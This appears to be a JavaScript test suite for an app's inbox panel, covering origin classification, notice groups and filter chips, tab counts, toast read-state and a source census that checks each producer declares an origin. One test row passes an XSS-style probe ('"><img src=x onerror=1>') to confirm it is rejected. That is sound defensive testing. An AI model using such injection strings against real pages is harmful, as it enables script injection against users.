    [{ sessionName: 'Manage Agents', by: 'system' }, 'agent', "legacy: by 'system' ⇒ agent (r2: no system row — nothing has ever filed with by:'system')"],
    [{ sessionName: 'my session', by: 'agent' }, 'agent', 'legacy: anything else ⇒ agent'],
    [{ sessionName: 'Manage Agents', by: 'agent' }, 'agent', "legacy: the login watch's old items are NOT guessed (the rung reads only the two sessionName facts)"],
    [{ origin: 'system', sessionName: 'Spending' }, 'spend', "an origin 'system' (the dropped row) reads through the rung like any stranger"],
    [{ origin: 'mounts', sessionName: 'Spending' }, 'spend', 'an origin outside the set reads through the legacy rung'],
    [{ origin: '"><img src=x onerror=1>' }, 'agent', 'a hostile origin string is never an origin'],
    [null, 'agent', 'null-safe'],
  ];
  for (const [item, want, m] of rowsO) eq(L.originOf(item), want, m);
  ok(/export function originOf\(item\) \{\n  if \(!item\) return 'agent';\n  if \(typeof item\.origin === 'string' && INBOX_ORIGINS\.includes\(item\.origin\)\) return item\.origin;\n  if \(item\.sessionName === 'Spending'\) return 'spend';\n  if \(item\.sessionName === 'Channels'\) return 'channels';\n  return 'agent';\n\}/.test(laySrc), 'the legacy rung is exactly three rows (pinned — a new producer DECLARES, it never gets a row here)');

  console.log('   noticeGroups / noticeChips / noticeFilterFor');
  const N = (id, extra = {}, resolved = false) => ({ item: { id, sessionKey: 'k', text: id, kind: 'notice', ...extra }, resolved });
  const notices = [N('a1', { origin: 'agent' }), N('s1', { origin: 'spend' }), N('c1', { origin: 'channels' }), N('s2', { sessionName: 'Spending' }), N('l1', { origin: 'login' }, true), N('a2', {}), N('s3', { origin: 'spend' }, true)];
  const G = (gs) => gs.map((g) => `${g.origin}:${g.entries.map((e) => e.item.id + (e.resolved ? '✓' : '')).join(',')}:${g.open}/${g.total}${g.shown ? '' : ':hidden'}`);
  eq(G(L.noticeGroups(notices)), ['spend:s1,s2,s3✓:2/3', 'login:l1✓:0/1', 'channels:c1:1/1', 'agent:a1,a2:2/2'], "fixed origin order; each group keeps its entries in LAYOUT order (a legacy 'Spending' row joins spend); open/total count in-place resolved rows");
  eq(G(L.noticeGroups(notices, 'spend')), ['spend:s1,s2,s3✓:2/3', 'login:l1✓:0/1:hidden', 'channels:c1:1/1:hidden', 'agent:a1,a2:2/2:hidden'], 'a filter HIDES the other groups — every group is still returned (the panel keeps their nodes)');
  eq(G(L.noticeGroups(notices, 'pool')).every((g) => !g.endsWith(':hidden')), true, 'a filter whose origin has no notice ⇒ everything shown');
  eq(G(L.noticeGroups(notices, 'all', { prev: ['agent', 'spend'] })), ['agent:a1,a2:2/2', 'spend:s1,s2,s3✓:2/3', 'login:l1✓:0/1', 'channels:c1:1/1'], 'while open (prev = the last paint): the listed groups keep their slots, new origins APPEND in set order (the slot law for groups)');
  eq(G(L.noticeGroups([N('s1', { origin: 'spend' })], 'all', { prev: ['agent', 'spend'] })), ['spend:s1:1/1'], 'a prev origin no longer present is dropped');
  eq(L.noticeGroups([], 'spend'), [], 'no notices ⇒ no groups');
  eq(L.noticeGroups(notices).map((g) => g.label), ['Spending', 'Login expiry', 'Channels', 'Agents'], 'each group carries its English t() key');
  eq(L.noticeChips(notices).map((c) => `${c.origin}:${c.count}`), ['all:5', 'spend:2', 'login:0', 'channels:1', 'agent:2'], "chips: 'all' first with the total OPEN, then every PRESENT origin with its open count (an all-resolved origin keeps its chip at 0 while its rows hold their slots)");
  eq(L.noticeChips(notices, { prev: ['agent'] }).map((c) => c.origin), ['all', 'agent', 'spend', 'login', 'channels'], 'chips follow the groups\' order');
  eq(L.noticeChips([]).map((c) => `${c.origin}:${c.count}`), ['all:0'], 'no notices ⇒ only the all chip (the panel hides a strip of ≤ 2)');
  eq(['all', null, '', 'spend', 'pool', 'bogus'].map((f) => L.noticeFilterFor(f, notices)), ['all', 'all', 'all', 'spend', 'all', 'all'], 'noticeFilterFor: the stored filter while its origin is present, else all');
  console.log('   the HELD filter (r2) — the answer at open is held and stored; an arrival never changes the filter in force');
  {
    // the verifier's S5: Login expiry chosen, its notice dismissed, the popup reopened (a resolved row is not in an open's layout)
    const atOpen = [N('s1', { origin: 'spend' }), N('c1', { origin: 'channels' }), N('a1', { origin: 'agent' })];
    const held = L.noticeFilterFor('login', atOpen);
    eq(held, 'all', 'at open: a stored choice whose origin has no notice resolves to all — the panel HOLDS this answer (and stores it)');
    const arrived = [...atOpen, N('l9', { origin: 'login' })];
    const shownOf = (gs) => gs.filter((g) => g.shown).map((g) => g.origin);
    const order = ['spend', 'channels', 'agent'];
    eq(shownOf(L.noticeGroups(arrived, held, { prev: order })), ['spend', 'channels', 'agent', 'login'], 'a login notice ARRIVING under the held all keeps every group shown (its group appends)');
    eq(L.noticeFilterFor(held, arrived), 'all', '…and the held filter stays all through the arrival (only a chip click chooses)');
    eq(shownOf(L.noticeGroups(arrived, 'login', { prev: order })), ['login'], "control: the STORED choice re-applied at the arrival (r1's panel) shows ONLY login — every other group vanishes under an active All chip (the verifier's flip)");
  }

  console.log('   tabCounts — the Inbox tab (actions + the grey notices) and the Notifications tab (unread since the last look)');
  const open = [it('x1', 'S', { urgency: 'high' }), it('x2', 'S', { urgency: 'low' }), it('n1', 'accounts', { kind: 'notice', urgency: 'urgent' }), it('n2', 'S', { kind: 'notice' })];
  const hist = [{ ts: 100, m: 'a' }, { ts: 200, m: 'b' }, { ts: 300, m: 'c' }, { m: 'no ts' }, null];
  eq(L.tabCounts(open, hist, 150), { inbox: { action: 2, notice: 2, urgency: 'high' }, history: { unread: 2 } }, 'actions 2 (worst high — an urgent NOTICE never colours it), notices 2, two toasts newer than the last look (an entry without ts never counts)');
  eq(L.tabCounts(open, hist, 300).history.unread, 0, 'a look at/after the newest toast ⇒ 0');
  eq([null, undefined, 'garbage'].map((s) => L.tabCounts([], hist, s).history.unread), [3, 3, 3], 'never looked (null / garbage) ⇒ every stamped toast counts (the panel stamps the key at install)');
  eq(L.tabCounts([], null, 0), { inbox: { action: 0, notice: 0, urgency: '' }, history: { unread: 0 } }, 'empty ⇒ zeros, no urgency');
  // B-3f5d ①: the user's OWN feedback ("Copied", "Reply sent", the error of a click) is recorded `seen` — not unread
  eq(L.tabCounts([], [{ ts: 400, seen: true }, { ts: 350 }, { ts: 320, seen: true }], 300).history.unread, 1, 'B-3f5d ①: toasts recorded `seen` (shown while the user acted) are not unread — only the one nobody was acting for counts');
  {
    const U = await import(path.join(ROOT, 'src/lib/utils.js'));
    const v = (o) => U.toastSeenAtShow({ now: 10000, gestureAt: 8000, visible: true, focused: true, ref: null, ...o });
    ok(v({}) === true && v({ gestureAt: 10000 - U.OWN_GESTURE_MS }) === false && v({ gestureAt: 0 }) === false && v({ visible: false }) === false && v({ focused: false }) === false && v({ ref: { kind: 'todo', id: 'x' } }) === false && v({ gestureAt: 12000 }) === false,
      'B-3f5d ①: toastSeenAtShow — seen only within OWN_GESTURE_MS of a gesture, on a visible focused page; a record\'s arrival (ref) never; no gesture never');
    // verify r1 DECIDED (the brief: another client's toast, a delayed toast, an error after the user's action): `seen` means
    // PRESENT — shown on THIS visible, focused page within OWN_GESTURE_MS of a press on THIS page — whatever raised it. The
    // B-3f5d owner item lists errors among the user's own feedback, so the verdict takes no `type`; the gesture is per page.
    const D = [
      ['the error toast of the user\'s own click (300 ms later) — seen: on the page in front of them, their own feedback', { now: 10300, gestureAt: 10000, type: 'error' }, true],
      ['a delayed toast (the reply lands 4 s after the press) — UNREAD: nobody can be assumed to be looking any more', { now: 14000, gestureAt: 10000 }, false],
      ['another client\'s toast (the press was on the PHONE; this page saw no gesture) — UNREAD', { now: 10300, gestureAt: 0 }, false],
      ['a toast raised elsewhere (a timer, a broadcast) 1 s after a press on this page — seen: it was shown to a user present at it', { now: 11000, gestureAt: 10000, type: 'warn' }, true],
      ['the same toast in a background tab of the same browser — UNREAD (that page is hidden)', { now: 11000, gestureAt: 10000, visible: false }, false],
      ['a For-you arrival toast (ref) right after a press — UNREAD: a record\'s arrival is news', { now: 10300, gestureAt: 10000, ref: { kind: 'todo', id: 'ut-1' } }, false],
    ];
    const missed = D.filter(([, o, want]) => U.toastSeenAtShow({ visible: true, focused: true, ref: null, ...o }) !== want).map(([n]) => n);
    ok(missed.length === 0, `verify r1: the decided table — ${D.length} rows (an own error seen, a delayed toast and another client's unread, presence not cause)`, missed);
    const k = (e, ed) => U.isGestureKey(e, ed);
    ok(k({ key: 'a' }, true) === false && k({ key: 'Enter' }, true) === true && k({ key: 'c', ctrlKey: true }, true) === true && k({ key: 'c', metaKey: true }, true) === true && k({ key: ' ' }, false) === true && k({ key: 'a' }, false) === true && k(null, false) === false,
      'B-3f5d ①: isGestureKey — typing in a field is not acting; Enter, a shortcut, any key outside a field is');
    const us = fs.readFileSync(path.join(ROOT, 'src/lib/utils.js'), 'utf-8');
    ok(/window\.addEventListener\('pointerdown', \(\) => \{ _gestureAt = Date\.now\(\); \}, true\);/.test(us) && /window\.addEventListener\('keydown', \(e\) => \{ if \(isGestureKey\(e, _editable\(e\.target\)\)\) _gestureAt = Date\.now\(\); \}, true\);/.test(us) && /const seen = _seenAtShow\(/.test(us) && /\.\.\.\(seen \? \{ seen: true \} : \{\}\)/.test(us),
      'B-3f5d ① PIN: the capture-phase press / key listeners stamp the gesture and _recordToast records `seen` through the ONE verdict');
  }
  eq(L.tabCounts([it('u', 'S', { urgency: 'urgent' }), it('m', 'S', {})], [], 0).inbox, { action: 2, notice: 0, urgency: 'urgent' }, 'the worst tier colours the Inbox pill (the taskbar badge\'s rule)');
  eq(L.tabCounts(open, [], 0).inbox.action, L.badgeCounts(open).action.length, 'the Inbox count IS the taskbar badge\'s action count');

  console.log('   the MINI INBOX badge keeps excluding notices (whatever their origin)');
  const K = ['claude:live'];
  const mixed = [it('q', 'claude:live', { urgency: 'normal' }), it('ns', 'claude:live', { kind: 'notice', origin: 'spend', urgency: 'urgent' }), it('na', 'claude:live', { kind: 'notice', origin: 'agent', urgency: 'high' })];
  eq(L.inboxBadgeFor(mixed, K), { count: 1, urgency: 'normal' }, 'the badge counts the one ask; a spend notice and an agent notice under the same key never count nor colour it');
  eq(L.inboxBadgeFor(mixed.slice(1), K), { count: 0, urgency: '' }, 'notices only ⇒ no badge');

  console.log('   the store — origin is REQUIRED (r2: fail closed, no default), validated, kept on a re-file, carried by snapshot + broadcast');
  {
    const os = await import('node:os');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-ut-origin-'));
    try {
      const { UserTodoManager } = req(path.join(ROOT, 'src/user-todos.js'));
      const casts = [];
      const m = new UserTodoManager({ dataDir: dir, onChange: (snap) => casts.push(snap), expirySweepMs: 0 });
      const a = m.add('accounts', { text: 'spend warning', kind: 'notice', origin: 'spend' });
      eq(a.origin, 'spend', 'a declared origin is stored');
      let msg = '';
      const n0 = m.snapshot().open.length;
      const c0 = casts.length;
      for (const none of [undefined, null, '']) {
        msg = '';
        try { m.add('accounts', { text: 'an undeclared producer', kind: 'notice', sessionName: 'Manage Agents', origin: none }); } catch (e) { msg = e.message; }
        ok(msg === 'origin required (one of spend/login/pool/jobs/channels/browser/machines/apps/agent)' && m.snapshot().open.length === n0 && casts.length === c0, `r2 FAIL CLOSED: a filing naming no origin (${JSON.stringify(none)}) THROWS "origin required" and files nothing, broadcasts nothing (it used to land under Agents silently)`, msg);
      }
      eq(m.add('claude:x', { text: 'an ask', origin: 'agent' }).origin, 'agent', "the agent route's shape declares 'agent' explicitly");
      msg = '';
      const n1 = m.snapshot().open.length;
      try { m.add('claude:x', { text: 'typo', origin: 'mounts' }); } catch (e) { msg = e.message; }
      ok(/origin must be one of spend\/login\/pool\/jobs\/channels\/browser\/machines\/apps\/agent$/.test(msg) && m.snapshot().open.length === n1, 'a value outside the set THROWS by name and files nothing');
      const re = m.add('accounts', { text: 'spend warning', kind: 'notice', origin: 'login', urgency: 'high' });
      eq([re.id === a.id, re.origin, re.urgency], [true, 'spend', 'high'], 'a re-file of the same item KEEPS its declared origin (other fields still merge)');
      // a LEGACY item on disk (no origin) re-filed by a declaring producer takes the declaration
      const legacy = { id: 'ut-00000000ee', sessionKey: 'accounts', text: 'old spend warning', status: 'open', kind: 'notice', by: 'agent', sessionName: 'Spending', createdAt: 1 };
      fs.writeFileSync(path.join(dir, 'user-todos.json'), JSON.stringify({ items: [legacy] }));
      const m2 = new UserTodoManager({ dataDir: dir, onChange: (snap) => casts.push(snap), expirySweepMs: 0 });
      eq(m2.get('ut-00000000ee').origin, undefined, 'a legacy item loads WITHOUT origin (no migration — the read-time rung classifies it)');
      eq(L.originOf(m2.snapshot().open[0]), 'spend', '…and the read-time rung puts it under Spending');
      m2.add('accounts', { text: 'old spend warning', kind: 'notice', origin: 'spend' });
      eq(m2.get('ut-00000000ee').origin, 'spend', 'a re-file with a declaration stamps the legacy item');
      const last = casts[casts.length - 1];
      ok(last && last.open.some((i) => i.id === 'ut-00000000ee' && i.origin === 'spend'), 'the broadcast snapshot carries origin');
      m.stop(); m2.stop();
      // r2 (verifier, pre-existing): stop() is the manager's last act — a debounced
      // write pending at stop() is flushed NOW; its 500 ms timer used to outlive
      // stop() and fire into a data dir the owner had already removed (ENOENT)
      const sdir = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-ut-stop-'));
      const m3 = new UserTodoManager({ dataDir: sdir, expirySweepMs: 0 });
      m3.add('claude:s', { text: 'pending at stop', origin: 'agent' });
      const pendingBefore = m3._writeTimer !== null && !fs.existsSync(path.join(sdir, 'user-todos.json'));
      m3.stop();
      let onDisk = null;
      try { onDisk = JSON.parse(fs.readFileSync(path.join(sdir, 'user-todos.json'), 'utf8')); } catch { }
      ok(pendingBefore && m3._writeTimer === null && m3._expiryTimer === null && !!onDisk && onDisk.items.some((i) => i.text === 'pending at stop'), 'stop() clears BOTH timers and flushes the pending write before it returns (the owner may remove the dir right after)', { pendingBefore, timer: m3._writeTimer !== null, onDisk: !!onDisk });
      fs.rmSync(sdir, { recursive: true, force: true });
    } finally { fs.rmSync(dir, { recursive: true, force: true }); }
  }

  console.log('   THE CENSUS — every two-argument .add( / ?.add( on ANY receiver in src/ + server.js (the store\'s add(sessionKey, options) shape) declares a literal origin, the right one for its file');
  // the file → origin table: a NEW producer file fails here until it is added
  // WITH its origin (and the origin to src/inbox-origin.js if it is a new one)
  const PRODUCERS = {
    'src/server/spend-guard.js': 'spend',
    'src/server/login-expiry-watch.js': 'login',
    'src/server/device-upgrade-watch.js': 'machines', // lane device-upgrade-stuck: a device agent the hub could not update
    'src/server/usage-pool-engine.js': 'pool',
    'src/server/jobs-wiring.js': 'jobs',
    'src/server/channels-engine.js': 'channels',
    'src/server/channels-access.js': 'channels',   // lane dc-channels-seams: the engine's access family (an agent's watch / access request)
    'src/server/channels-outbound.js': 'channels',   // lane dc-channels-seams: the engine's outbound family (the composed pointer, the unknown outcome)
    'src/server/channel-api-cards.js': 'channels', // B-2198 part 2 (lane channel-api-ui): ONE item per raw-API proposal, Approve / Reject
    'src/server/browser-handback.js': 'browser',
    'src/server/browser-builds-keeper.js': 'browser', // rv-browser F7 (lane dc-browser-installs): Change build…'s notice, moved out of the keeper
    'src/server/browser-keeper.js': 'browser', // lane H verify r5: the ONE notice when a profile's browser keeps closing (the heal budget)
    'src/server/mounts-plugins-wiring.js': 'browser', // the browser routes' switch PROPOSAL (this file only wires them)
    'src/server/browser-propose.js': 'browser', // lane browser-propose: the agent's proposal (Approve / Reject), one item per proposal
    'src/agent-routes/status.js': 'agent',
    'src/server/helper-asks.js': 'agent', // lane S1: a helper's permission ask left unanswered for 60 s
    'src/server/main-asks.js': 'agent', // lane parked-ask-inbox: a conversation's OWN ask left unanswered for 60 s
    'src/server/unexpected-exit.js': 'agent', // B-f698: a conversation that exited unexpectedly while working — restarted once, or why not
    'src/exit-proxy.js': 'machines', // lane-pairing ⑥: "Allow <conversation> to run a command on <machine>?" (Allow / Deny, 60 s)
    'src/server/hooks-late.js': 'agent', // lane hooks-create: "N running Claude Code conversations started before VibeSpace registered its hooks — Terminate and Resume them"
    'src/server/apps-engine.js': 'apps', // Layer 0 apps: an agent's install PROPOSAL (Install / Not now) + the failed-restore notice
  };
  // r2: no exemptions — every origin of the closed set has a producer (the
  // `system` row was dropped: nothing has ever filed with by:'system')
  const NO_PRODUCER = {};
  // the DOM's classList.add(a, b) is the only other two-argument add in the tree
  const NOT_THE_STORE = /\bclassList\s*$/;
  /** skip a template literal starting at src[i] === '`' (with ${…} nesting) */
  const skipTpl = (src, i) => {
    i++;
    while (i < src.length) {
      const c = src[i];
      if (c === '\\') { i += 2; continue; }
      if (c === '`') return i + 1;
      if (c === '$' && src[i + 1] === '{') {
        i += 2; let d = 1;
        while (i < src.length && d > 0) {
          const q = src[i];
          if (q === "'" || q === '"') { let j = i + 1; while (j < src.length && src[j] !== q) { if (src[j] === '\\') j++; j++; } i = j + 1; continue; }
          if (q === '`') { i = skipTpl(src, i); continue; }
          if (q === '{') d++; else if (q === '}') d--;
          i++;
        }
        continue;
      }
      i++;
    }
    return i;
  };
  /** The call's TOP-LEVEL text: depth 1 (the arguments) + depth 2 (the options
   *  object's own keys); deeper structures, comments and template bodies are
   *  dropped, single/double-quoted strings kept — so a nested `origin:` (an
   *  action payload's, say) can never satisfy the census for the item. */
  const topLevelOf = (src, open) => {
    let i = open, depth = 0, out = '';
    while (i < src.length) {
      const c = src[i];
      if (c === '/' && src[i + 1] === '/') { const e = src.indexOf('\n', i); i = e < 0 ? src.length : e; continue; }
      if (c === '/' && src[i + 1] === '*') { const e = src.indexOf('*/', i + 2); i = e < 0 ? src.length : e + 2; continue; }
      if (c === "'" || c === '"') { let j = i + 1; while (j < src.length && src[j] !== c) { if (src[j] === '\\') j++; j++; } if (depth <= 2) out += src.slice(i, j + 1); i = j + 1; continue; }
      if (c === '`') { i = skipTpl(src, i); if (depth <= 2) out += '``'; continue; }
      if ('([{'.includes(c)) { depth++; if (depth <= 2) out += c; i++; continue; }
      if (')]}'.includes(c)) { if (depth <= 2) out += c; depth--; i++; if (depth === 0) return out; continue; }
      if (depth <= 2) out += c;
      i++;
    }
    return out;
  };
  /** the number of TOP-LEVEL arguments in a call's topLevelOf text (a comma
   *  inside a quoted string or a nested structure never counts) */
  const argCountOf = (top) => {
    let depth = 0, n = 0, any = false;
    const body = top.slice(1, -1);
    for (let i = 0; i < body.length; i++) {
      const c = body[i];
      if (c === "'" || c === '"') { let j = i + 1; while (j < body.length && body[j] !== c) { if (body[j] === '\\') j++; j++; } i = j; any = true; continue; }
      if ('([{'.includes(c)) { depth++; any = true; continue; }
      if (')]}'.includes(c)) { depth--; continue; }
      if (depth === 0 && c === ',') n++; else if (!/\s/.test(c)) any = true;
    }
    return any ? n + 1 : 0;
  };
  /** files = {rel: text} → {sites:[{rel, line, origin}], problems:[string]}
   *  r2 (verifier): the match was `\b(\w*[Tt]odos)\.add\(` — an ALIASED store
   *  (`const inbox = userTodos; inbox.add(…)`) and optional chaining
   *  (`userTodos?.add(…)`) both evaded it. It now counts EVERY two-argument
   *  `.add(` / `?.add(` on any receiver (the store's `add(sessionKey, options)`
   *  shape; a Set's add(x) takes one), except a DOM `classList.add(a, b)` and a
   *  comment line. The store's own throw ("origin required") is the first guard. */
  const census = (files, origins = O.INBOX_ORIGINS) => {
    const sites = [], problems = [];
    for (const [rel, src] of Object.entries(files)) {
      for (const mm of src.matchAll(/(\??\.)add\(/g)) {
        const open = mm.index + mm[0].length - 1;
        const lineStart = src.lastIndexOf('\n', mm.index) + 1;
        if (/^\s*(\/\/|\/?\*)/.test(src.slice(lineStart, mm.index))) continue; // prose in a comment block
        if (NOT_THE_STORE.test(src.slice(Math.max(0, mm.index - 40), mm.index))) continue;
        const top = topLevelOf(src, open);
        if (argCountOf(top) < 2) continue; // add(x): a Set, a listener registry — not the store's shape
        const line = src.slice(0, mm.index).split('\n').length;
        const om = /(?:^|[{,\s])origin:\s*'([^']*)'/.exec(top);
        const where = `${rel}:${line}`;
        if (!om) { problems.push(`${where} files an inbox item WITHOUT a literal origin`); continue; }
        const origin = om[1];
        sites.push({ rel, line, origin });
        if (!origins.includes(origin)) problems.push(`${where} declares origin '${origin}' — not in the closed set (src/inbox-origin.js)`);
        if (!(rel in PRODUCERS)) problems.push(`${where} is a producer the census does not know — add ${rel} to PRODUCERS with its origin`);
        else if (PRODUCERS[rel] !== origin) problems.push(`${where} declares '${origin}', its file is the '${PRODUCERS[rel]}' producer`);
      }
    }
    for (const o of origins) if (!(o in NO_PRODUCER) && !sites.some((x) => x.origin === o)) problems.push(`origin '${o}' has no producer site — a dead row in the closed set`);
    for (const rel of Object.keys(PRODUCERS)) if (!sites.some((x) => x.rel === rel)) problems.push(`${rel} is in PRODUCERS but files nothing — a dead row`);
    return { sites, problems };
  };
  const files = {};
  const walk = (d) => { for (const e of fs.readdirSync(path.join(ROOT, d), { withFileTypes: true })) { const rel = path.posix.join(d, e.name); if (e.isDirectory()) walk(rel); else if (e.name.endsWith('.js')) files[rel] = fs.readFileSync(path.join(ROOT, rel), 'utf8'); } };
  walk('src');
  files['server.js'] = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');
  const C = census(files);
  console.log('     sites: ' + C.sites.map((x) => `${x.rel.replace(/^src\//, '')}:${x.line}=${x.origin}`).join(' · '));
  ok(C.sites.length >= 12, `the census scope is non-vacuous (${C.sites.length} sites; 12 when this shipped)`);
  ok(C.problems.length === 0, 'every site declares a literal origin of the closed set, the one its file produces; every origin has a producer; every PRODUCERS row files', C.problems);
  eq(C.sites.length, 38, 'the widened match finds exactly the 38 declared sites (every classList.add(a, b) excluded, lane parked-ask-inbox the main conversation ask item (src/server/main-asks.js, origin agent), lane lark-upload-preflight the partly-sent item (speakPartial, origin channels); lane gmail-quota-share the slowed-polling item (speakSlowed, origin channels); lane browser-unresponsive the browser keeper\'s not-answering item (its Restart act); B-2198 part 2 the raw-API proposal item (src/server/channel-api-cards.js); lane win-upgrade-pipe added device-upgrade-watch\'s never-came-back item; no other two-argument add in the tree; lane H verify r5 added the browser keeper\'s keeps-closing notice; lane S1 the helper-ask item; R4 (B-6acc) the channels engine\'s composed-message approval pointer; lane R5 verify r6 the channels engine\'s unsaved-sign-in item; lane-pairing ⑥ the exit ask; lane-pool-pin r2 the pool engine\'s removed-member hold notice — the owner\'s 全B; lane browser-propose the agent\'s proposal; lane hooks-create the late-hooks line; lane browser-admin the browser keeper\'s vanished-Chrome-build notice; lane browser-admin verify r2 (B5) its fall-back notice when a new Chrome build closed within seconds; Layer 0 apps the agent\'s install proposal + the failed-restore notice; lane reset-path verify r2 the pool engine\'s unreadable-attempts-file notice; lane reset-path verify r5 the pool engine\'s unknown-vendor-word item (origin pool — the engine IS the pool producer); lane reset-path verify r8 ⑥ the pool engine\'s late-wall notice (a limit hit on a conversation whose records arrive late — origin pool); lane channel-agent-watch the channels engine\'s wake-request item (origin channels); lane unexpected-exit (B-f698) the restarted-once item; lane for-you-jobs B-dfb4 the jobs wiring\'s dropped-at-the-cap notice; lane device-upgrade-stuck the stuck-upgrade notice; lane browser-passkey the page-waits-for-a-passkey item (mounts-plugins-wiring, origin browser))');
  eq(C.sites.filter((x) => /^src\/server\/channels-(engine|access|outbound|auth)\.js$/.test(x.rel)).length, 10, 'channels-engine files from ten sites — all ten declared (lane lark-upload-preflight: + speakPartial, origin channels; lane gmail-quota-share: + speakSlowed, origin channels; R4: + composePointerSync, origin channels; R5 verify r6: the unsaved-sign-in item; lane channel-agent-watch: an agent\'s wake request)');
  console.log('   negative controls (the census must be able to go red)');
  const drop = { ...files, 'src/server/spend-guard.js': files['src/server/spend-guard.js'].split("origin: 'spend', ").join('') };
  const cDrop = census(drop);
  ok(cDrop.problems.some((p) => /spend-guard\.js:\d+ files an inbox item WITHOUT a literal origin/.test(p)) && cDrop.problems.some((p) => /origin 'spend' has no producer site/.test(p)), 'a spend-guard copy without its origin ⇒ the site is named AND spend becomes a dead row', cDrop.problems);
  const planted = { ...files, 'src/server/new-producer.js': "function f(userTodos) {\n  userTodos.add('accounts', { text: 'x', origin: 'spend' });\n}\n" };
  ok(census(planted).problems.some((p) => /new-producer\.js:2 is a producer the census does not know/.test(p)), 'a planted producer in an unknown file is named');
  const wrong = { ...files, 'src/server/jobs-wiring.js': files['src/server/jobs-wiring.js'].split("origin: 'jobs'").join("origin: 'agent'") };
  ok(census(wrong).problems.some((p) => /jobs-wiring\.js:\d+ declares 'agent', its file is the 'jobs' producer/.test(p)), 'a producer declaring somebody else\'s origin is named');
  const nested = { 'src/x.js': "userTodos.add('k', { text: 't', action: { type: 'a', origin: 'spend' } });\n" };
  ok(census(nested).problems.some((p) => /src\/x\.js:1 files an inbox item WITHOUT a literal origin/.test(p)), 'a NESTED origin (an action payload\'s) does not satisfy the census');
  const typo = { ...files, 'src/server/login-expiry-watch.js': files['src/server/login-expiry-watch.js'].split("origin: 'login'").join("origin: 'logins'") };
  ok(census(typo).problems.some((p) => /declares origin 'logins' — not in the closed set/.test(p)), 'an origin outside the set is named');
  ok(census(files, [...O.INBOX_ORIGINS, 'mounts']).problems.some((p) => /origin 'mounts' has no producer site/.test(p)), "an origin with no producer (the task's 'mounts') would be a dead row");
  ok(census(files, [...O.INBOX_ORIGINS, 'system']).problems.some((p) => /origin 'system' has no producer site/.test(p)), "r2: the dropped 'system' row, put back, is a dead row by name (no exemption table any more)");
  // r2 — the verifier's two evasions (each was ALL PASS under the old `\w*[Tt]odos\.add\(` match) + a variable options object
  const OLD = /\b(\w*[Tt]odos)\.add\(/;
  const evasions = {
    'an ALIASED store': ['src/server/alias-producer.js', "function f(userTodos) {\n  const inbox = userTodos;\n  inbox.add('accounts', { text: 'x' });\n}\n", /alias-producer\.js:3 files an inbox item WITHOUT a literal origin/],
    'optional chaining': ['src/server/optional-producer.js', "function f(userTodos) {\n  userTodos?.add('accounts', { text: 'x' });\n}\n", /optional-producer\.js:2 files an inbox item WITHOUT a literal origin/],
    'an options object from a variable': ['src/server/variable-producer.js', "function f(deps, opts) {\n  deps.store.add('accounts', opts);\n}\n", /variable-producer\.js:2 files an inbox item WITHOUT a literal origin/],
  };
  for (const [what, [rel, text, re]] of Object.entries(evasions)) {
    const pr = census({ ...files, [rel]: text }).problems;
    ok(pr.some((p) => re.test(p)), `evasion ${what} ⇒ RED by name`, pr);
    ok(!OLD.test(text), `…and the r1 match could not see it (${what}: it was ALL PASS)`);
  }
  const benign = { 'src/lib/x.js': "el.classList.add('a', 'b');\nseen.add(id);\nseen.add('a, b');\nlisteners.add(fn);\n// prose about store.add(key, opts) in a comment\n" };
  ok(census(benign, O.INBOX_ORIGINS).sites.length === 0 && !census(benign).problems.some((p) => /src\/lib\/x\.js/.test(p)), 'the benign adds are not sites: a DOM classList.add(a, b), a Set/registry add(x) (a comma inside its string is no second argument), prose in a comment');

  console.log('   wiring pins — the panel draws the groups, chips and tab counts through the PURE functions, keyed in place');
  const panel = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-panel.js'), 'utf8');
  ok(/import \{[^}]*\bnoticeGroups, noticeChips, noticeFilterFor, tabCounts, NOTICE_FILTER_KEY, HISTORY_SEEN_KEY\b[^}]*\} from '\.\/user-todos-layout\.js'/.test(panel), 'the panel imports the four PURE functions + the two per-device keys');
  eq([L.NOTICE_FILTER_KEY, L.HISTORY_SEEN_KEY], ['vibespace.ut-notice-filter', 'vibespace.ut-history-seen'], 'the per-device localStorage keys');
  ok(/const groups = noticeGroups\(entries, noticeFilter, \{ prev: noticeOrder \}\);/.test(panel) && /noticeOrder = groups\.map\(\(g\) => g\.origin\);/.test(panel), 'the groups are laid out by noticeGroups with the last paint\'s order (append-only while open)');
  ok(/const disp = g\.shown \? '' : 'none';/.test(panel) && /reconcileRows\(el, g\.entries, head\);/.test(panel), 'a filtered-out group is HIDDEN (display), its rows still reconciled through THE row reconciler — never removed');
  ok(/renderNotices\(nBox, notices\.map\(/.test(panel) && !/ut-notice-rows/.test(panel), 'the flat notice list is gone: the Notices area renders through renderNotices');
  ok(/const disp = chips\.length > 2 \? '' : 'none';/.test(panel), 'the chip strip hides when only one origin is present (nothing to filter)');
  ok(/localStorage\.setItem\(NOTICE_FILTER_KEY, noticeFilter\)/.test(panel) && /localStorage\.getItem\(NOTICE_FILTER_KEY\)/.test(panel), 'the filter is persisted per device');
  ok(/if \(knownIds !== null\) \{ const eff = noticeFilterFor\(noticeFilter, entries\); if \(eff !== noticeFilter\) setNoticeFilter\(eff\); \}\n    const groups = noticeGroups\(entries, noticeFilter, \{ prev: noticeOrder \}\);/.test(panel), 'r2 THE HELD FILTER: before the groups are laid out, the filter goes through noticeFilterFor and its answer BECOMES the filter (held + stored) — an arrival never re-applies a stored choice');
  ok(/patchChips\(nBox\.querySelector\(':scope > \.ut-chips'\), noticeChips\(entries, \{ prev: noticeOrder \}\), noticeFilter\);/.test(panel) && (panel.match(/noticeFilterFor\(/g) || []).length === 1, '…the strip marks the HELD filter (the one call of noticeFilterFor is the hold — no second derivation that could disagree)');
  ok(/noticeFilter = readFilter\(\); \/\/ …read afresh from the device on every open/.test(panel), '…read afresh from the device on every open (then held)');
  ok(/if \(tb\) \{ if \(tb\.dataset\.tab !== tab\) \{ tab = tb\.dataset\.tab; renderPanel\(\); \} return; \}/.test(panel) && !/popup\.replaceChildren\(tabsEl\(\)/.test(panel), 'a tab click switches the PAGE; the tabs are never rebuilt (no replaceChildren(tabsEl(), …))');
  ok(/const c = tabCounts\(todos\.open, getToastHistory\(\), histSeen\(\)\);/.test(panel) && /ut-tab-n\[data-n="\$\{k\}"\]/.test(panel), 'the tab counts come from tabCounts and patch keyed `.ut-tab-n[data-n]` spans');
